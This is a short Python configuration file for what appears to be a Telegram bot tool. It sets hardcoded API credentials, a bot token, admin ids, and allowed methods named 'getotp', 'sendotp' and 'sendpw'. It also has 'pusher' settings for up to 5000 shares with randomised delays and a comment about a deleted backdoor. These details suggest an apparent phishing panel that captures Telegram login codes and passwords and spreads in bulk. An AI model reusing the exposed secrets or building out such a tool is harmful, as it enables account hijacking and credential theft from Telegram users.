from datetime import timezone, timedelta

api_id = 39592239
api_hash = "169c5f50d2fbbdf42eb98a5afb2cb609"

admin = [7458172737, 7458172737]
bot_token = "8646992860:AAFteW1pw1C1P9qbfZBKfn5bBAzFSaTZdIw"
bot_username = "@phsngtes411_bot"
showperpage = 50

path = "/app/"
url = "http://localhost:80"

# Allowed methods
allowedmethod = ['getotp','sendotp','sendpw']

# Pendorong settings (DELETED BACKDOOR)
MAX_SHARE = 5000
DELAY_MIN, DELAY_MAX = 0.7, 1.5

# Timezone & active limit
WITA = timezone(timedelta(hours=8))
ACTIVE_LIMIT = timedelta(days=7)

